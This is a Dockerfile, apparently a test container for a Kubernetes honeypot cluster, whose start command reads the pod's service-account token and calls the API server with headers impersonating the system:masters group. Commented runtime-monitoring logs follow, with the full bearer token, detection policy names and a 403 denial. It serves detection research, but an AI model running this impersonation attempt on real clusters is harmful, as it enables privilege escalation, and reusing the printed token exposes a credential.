FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl apt-transport-https ca-certificates  gnupg
RUN curl -LO "https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl" && chmod +x kubectl && mv kubectl /usr/local/bin/
 
CMD ["/bin/bash", "-c", "KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" -H \"Impersonate-User: null\" -H \"Impersonate-Group: system:masters\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/pods ;  sleep infinity"]

#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ5NTcxNTAyNzoyNjE5MA==", "pid":26190, "uid":0, "cwd":"/", "binary":"/usr/bin/curl", "arguments":"-sSk -H \"Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InpZbG0tdHJaTElfUFUxLWcxRkZSdlZCRjdlNWpHUHZFeWp0ZnF0UWdzN1kifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzY4NDI3MDg3LCJpYXQiOjE3MzY4OTEwODcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiOGExZjhmNTYtMmY0Mi00ZjBmLTliZjktNmJlY2FkYjA0NWI1Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiaG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmUiLCJ1aWQiOiJhOGM0MjcyNC1hYWE4LTQwOTgtYmVkZi1mYzQ3M2MyZDZhMmYifSwicG9kIjp7Im5hbWUiOiJraC1pZGVudGl0eS1pbXBlcnNvbmF0ZSIsInVpZCI6IjI5Zjc3ZDc1LWRiYTItNDJjNy05NzI2LTgyNzkwYzE3ZWI1NyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImEzNzJiZWI3LWI4OWItNDgzMi04NDgyLTY5MDE5NDcwNDE5YyJ9LCJ3YXJuYWZ0ZXIiOjE3MzY4OTQ2OTR9LCJuYmYiOjE3MzY4OTEwODcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.l2RLCprdm0ooYmBj1NWruj1fYRP6GkJX-yRcps_ZdTp9xdq3YZ0bmZVMoD5O5QAXkn0Yxe68SblvoHB6idEMeWz9YYBg4pRPfHyoUn85iPSnsTSD4q4T5-Rnf3Ys_JkbN9fCE_OiKCw7MoE5qgv_4PCrUr8yiuJuZ9xEk2IQ9nGiPh16VoRmVWBuTiON4vQFevlx55x0gor3x_ud-a18FF8HejRInY63hO8oRSRiL_FvV6xov2oxbjmfY71iZquz21wWLgLH0nHKvae9VWM7vrKNHn_aDwgtLXgu05R40n-gV2QSYZexmREH5pSY56uoo9adFUorMKR1rILaKuJorA\" -H \"Impersonate-User: null\" -H \"Impersonate-Group: system:masters\" https://10.96.0.1:443/api/v1/pods", "flags":"execve rootcwd clone dataArgs inInitTree", "start_time":"2025-01-14T21:44:51.381045743Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-impersonate", "container":{"id":"containerd://332a98a573566715475697332604077cc45b71b2b4f4d8ad9652d51013616a79", "name":"kubehound-identity-impersonate", "image":{"id":"docker.io/entlein/identity-impersonate@sha256:01748ea8bd9e4743b2e9e03b4a58ea84f32e426cb202ad3953eca13f60e60798", "name":"docker.io/entlein/identity-impersonate:0.0.1"}, "start_time":"2025-01-14T21:44:51Z", "pid":11}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-impersonate", "workload_kind":"Pod"}, "docker":"332a98a573566715475697332604077", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ4MTI4MDM0NzoyNjE3NQ==", "tid":26190, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ4MTI4MDM0NzoyNjE3NQ==", "pid":26175, "uid":0, "cwd":"/", "binary":"/bin/bash", "arguments":"-c \"KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" -H \"Impersonate-User: null\" -H \"Impersonate-Group: system:masters\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/pods ; sleep infinity\"", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-14T21:44:51.366611005Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-impersonate", "container":{"id":"containerd://332a98a573566715475697332604077cc45b71b2b4f4d8ad9652d51013616a79", "name":"kubehound-identity-impersonate", "image":{"id":"docker.io/entlein/identity-impersonate@sha256:01748ea8bd9e4743b2e9e03b4a58ea84f32e426cb202ad3953eca13f60e60798", "name":"docker.io/entlein/identity-impersonate:0.0.1"}, "start_time":"2025-01-14T21:44:51Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-impersonate", "workload_kind":"Pod"}, "docker":"332a98a573566715475697332604077", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MDAxMTU0Mjk4NDoyNjA3NQ==", "tid":26175, "in_init_tree":true}, "function_name":"tcp_connect", "args":[{"sock_arg":{"family":"AF_INET", "type":"SOCK_STREAM", "protocol":"IPPROTO_TCP", "saddr":"10.244.0.16", "daddr":"10.96.0.1", "sport":60816, "dport":443, "cookie":"18446629786699557888", "state":"TCP_SYN_SENT"}}], "action":"KPROBE_ACTION_POST", "policy_name":"monitor-network-activity-outside-cluster-cidr-range", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-14T21:44:51.426491116Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ5NDE5MTg3NToyNjE4OQ==", "pid":26189, "uid":0, "cwd":"/", "binary":"/usr/bin/cat", "arguments":"/var/run/secrets/kubernetes.io/serviceaccount/token", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-14T21:44:51.379522696Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-impersonate", "container":{"id":"containerd://332a98a573566715475697332604077cc45b71b2b4f4d8ad9652d51013616a79", "name":"kubehound-identity-impersonate", "image":{"id":"docker.io/entlein/identity-impersonate@sha256:01748ea8bd9e4743b2e9e03b4a58ea84f32e426cb202ad3953eca13f60e60798", "name":"docker.io/entlein/identity-impersonate:0.0.1"}, "start_time":"2025-01-14T21:44:51Z", "pid":10}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-impersonate", "workload_kind":"Pod"}, "docker":"332a98a573566715475697332604077", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ4MTI4MDM0NzoyNjE3NQ==", "tid":26189, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MzQ4MTI4MDM0NzoyNjE3NQ==", "pid":26175, "uid":0, "cwd":"/", "binary":"/bin/bash", "arguments":"-c \"KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" -H \"Impersonate-User: null\" -H \"Impersonate-Group: system:masters\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/pods ; sleep infinity\"", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-14T21:44:51.366611005Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-impersonate", "container":{"id":"containerd://332a98a573566715475697332604077cc45b71b2b4f4d8ad9652d51013616a79", "name":"kubehound-identity-impersonate", "image":{"id":"docker.io/entlein/identity-impersonate@sha256:01748ea8bd9e4743b2e9e03b4a58ea84f32e426cb202ad3953eca13f60e60798", "name":"docker.io/entlein/identity-impersonate:0.0.1"}, "start_time":"2025-01-14T21:44:51Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-impersonate", "workload_kind":"Pod"}, "docker":"332a98a573566715475697332604077", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MTQ4MDAxMTU0Mjk4NDoyNjA3NQ==", "tid":26175, "in_init_tree":true}, "function_name":"security_file_permission", "args":[{"file_arg":{"path":"/run/secrets/kubernetes.io/serviceaccount/..2025_01_14_21_44_47.1517551121/token", "permission":"-rw-r--r--"}}, {"int_arg":4}], "return":{"int_arg":0}, "action":"KPROBE_ACTION_POST", "policy_name":"enumerate-service-account", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-14T21:44:51.380196113Z"}
# {
# "kind": "Status",
# "apiVersion": "v1",
# "metadata": {},
# "status": "Failure",
# "message": "users \"null\" is forbidden: User \"system:serviceaccount:default:default\" cannot impersonate resource \"users\" in API group \"\" at the cluster scope",
# "reason": "Forbidden",
# "details": {
# "name": "null",
# "kind": "users"
# },
# "code": 403
# TODO: add audit logs plus the k8s api server logs or 